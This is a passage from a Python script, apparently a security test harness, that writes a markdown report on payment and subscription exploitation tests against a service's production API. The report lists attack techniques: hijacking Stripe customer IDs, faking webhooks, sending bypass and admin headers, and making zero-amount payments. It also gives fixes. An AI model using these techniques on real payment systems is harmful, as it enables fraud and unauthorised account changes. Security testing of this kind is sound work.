User was able to activate free trial through exploitable endpoints.

**CVSS Score:** 5.0-7.0 (Medium-High)
**Impact:** Repeated trial abuse, revenue loss
"""
    else:
        report += """
**‚úÖ NO - Security Working**

All trial activation attempts were properly controlled.
"""

    report += """
### 4. Can user manipulate priority score?
"""

    priority_changed = (
        ashley_after and ashley_before and
        ashley_after['priorityScore'] != ashley_before['priorityScore']
    )
    if priority_changed:
        report += """
**‚ö†Ô∏è YES - Vulnerability Found**

User was able to manipulate their priority score.

**CVSS Score:** 7.5 (High)
**Impact:** Waitlist manipulation, unfair advantage
"""
    else:
        report += """
**‚úÖ NO - Security Working**

Priority score manipulation attempts were blocked.
"""

    report += """
---

## BASELINE STATUS

### Sameer (User 20254) - Has Cabin+ Subscription
```json
{
"""
    if sameer_before:
        report += f"""  "subscriptionStatus": {sameer_before['subscriptionStatus']},
  "membershipTier": "{sameer_before['membershipTier']}",
  "priorityScore": {sameer_before['priorityScore']},
  "stripeCustomerId": "{sameer_before['stripeCustomerId']}",
  "stripeSubscriptionId": "{sameer_before['stripeSubscriptionId']}"
"""
    report += """}
```

### Ashley (User 26927) - No Subscription
```json
{
"""
    if ashley_before:
        report += f"""  "subscriptionStatus": {ashley_before['subscriptionStatus']},
  "membershipTier": {ashley_before['membershipTier']},
  "priorityScore": {ashley_before['priorityScore']},
  "stripeCustomerId": {ashley_before['stripeCustomerId']},
  "stripeSubscriptionId": {ashley_before['stripeSubscriptionId']}
"""
    report += """}
```

---

## FINAL STATUS (AFTER ALL TESTS)

### Ashley's Final Status
```json
{
"""
    if ashley_after:
        report += f"""  "subscriptionStatus": {ashley_after['subscriptionStatus']},
  "membershipTier": {ashley_after['membershipTier']},
  "priorityScore": {ashley_after['priorityScore']},
  "stripeCustomerId": "{ashley_after['stripeCustomerId']}",
  "stripeSubscriptionId": "{ashley_after['stripeSubscriptionId']}"
"""
    report += """}
```

"""

    if ashley_after and ashley_before:
        if ashley_after['subscriptionStatus'] != ashley_before['subscriptionStatus']:
            report += "**üö® SUBSCRIPTION STATUS CHANGED!**\n\n"
        if ashley_after['stripeCustomerId'] != ashley_before['stripeCustomerId']:
            report += "**üö® STRIPE CUSTOMER ID CHANGED!**\n\n"

    if results['successful_exploits']:
        report += """---

## DETAILED VULNERABILITY FINDINGS

"""
        for i, vuln in enumerate(results['successful_exploits'], 1):
            report += f"""### Vulnerability #{i}: {vuln['test_name']}

**Severity:** {vuln['severity']}
**CVSS Score:** {vuln['cvss']}
**Category:** {vuln['category']}
**User:** {vuln['user']}

**Attack Details:**
- **Method:** `{vuln['method']}`
- **Endpoint:** `{vuln['endpoint']}`
- **Payload:**
```json
{json.dumps(vuln['payload'], indent=2)}
```

**Changes Made:**
"""
            for change in vuln['changes']:
                report += f"- {change}\n"

            report += f"""
**Before Attack:**
```json
{json.dumps(vuln['before'], indent=2)}
```

**After Attack:**
```json
{json.dumps(vuln['after'], indent=2)}
```

---

"""

    report += """## ATTACK CATEGORIES TESTED

### 1. Direct Subscription Status Modification
- Attempted to modify `subscriptionStatus` field directly
- Tested across v1, v2, and v3 API versions
- Tried PATCH, PUT, POST methods

### 2. Stripe Customer ID Manipulation
- Attempted to hijack another user's Stripe customer ID
- Tried to link/attach existing Stripe subscriptions
- Tested Stripe-specific endpoints

### 3. Free Trial Activation
- Attempted to activate free trials
- Tested trial extension vulnerabilities
- Looked for repeated trial activation

### 4. Membership Tier Manipulation
- Direct tier modification attempts
- License object manipulation
- Membership upgrade endpoints

### 5. Payment Verification Bypass
- Zero-amount payment attempts
- Skip payment flags
- Fake payment verification

### 6. Referral/Promo Code Abuse
- Tested common promo codes
- Attempted coupon redemption
- Referral bonus exploitation

### 7. Priority Score Manipulation
- Combined subscription + priority score changes
- Score boosting through subscription

### 8. Webhook Exploitation
- Fake Stripe webhook events
- Subscription update webhooks
- Payment success webhooks

### 9. Header-Based Privilege Escalation
- X-Bypass-Payment header
- X-Admin header
- Other privilege escalation headers

### 10. Cross-User Manipulation
- Attempted to modify other users' subscriptions
- Subscription transfer attempts

### 11. API Version Inconsistencies
- v1 vs v2 vs v3 endpoint differences
- Version-specific vulnerabilities

### 12. Batch/Bulk Operations
- Bulk subscription activation
- Batch user updates

---

## RECOMMENDATIONS

"""

    if results['critical_vulnerabilities']:
        report += """### CRITICAL PRIORITY

The following critical vulnerabilities must be fixed immediately:

"""
        for vuln in results['critical_vulnerabilities']:
            report += f"""1. **{vuln['test_name']}**
   - Endpoint: `{vuln['endpoint']}`
   - Fix: Implement server-side validation and authorization for subscription changes
   - Ensure all payment modifications require valid Stripe payment confirmation

"""

    if results['high_vulnerabilities']:
        report += """### HIGH PRIORITY

"""
        for vuln in results['high_vulnerabilities']:
            report += f"1. **{vuln['test_name']}** - {vuln['endpoint']}\n"

    report += """
### General Security Recommendations

1. **Server-Side Validation**
   - Never trust client-provided subscription/payment data
   - All subscription changes must be validated against Stripe

2. **Authorization Checks**
   - Implement proper authorization for all payment endpoints
   - Users should only modify their own subscription data

3. **Stripe Webhook Verification**
   - Verify Stripe webhook signatures
   - Don't accept webhook data from authenticated endpoints

4. **Payment Verification**
   - All subscription activations must verify actual payment
   - Zero-amount payments should be rejected for paid tiers

5. **API Consistency**
   - Ensure v1, v2, and v3 APIs have consistent security controls
   - Newer API versions shouldn't bypass security checks

6. **Rate Limiting**
   - Implement rate limiting on subscription/payment endpoints
   - Prevent automated abuse attempts

---

## TESTING METHODOLOGY

This test suite executed {results['total_tests']} different attack vectors across multiple categories:

1. Each attack was attempted with appropriate authentication tokens
2. Before/after state was captured to detect any changes
3. Multiple API versions were tested for consistency
4. Both privileged (Sameer) and unprivileged (Ashley) accounts were used
5. Special headers and edge cases were tested

All tests were conducted in a controlled environment against the production API with test accounts.

---

**Report Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Test Duration:** Complete comprehensive security assessment
**Next Steps:** Review findings and implement recommended security controls
"""

    # Write to file
    with open('/home/user/vaunt/PAYMENT_SUBSCRIPTION_EXPLOITATION_RESULTS.md', 'w') as f:
        f.write(report)

    print(f"\n‚úÖ Detailed report written to: /home/user/vaunt/PAYMENT_SUBSCRIPTION_EXPLOITATION_RESULTS.md")

if __name__ == "__main__":
    run_all_tests()
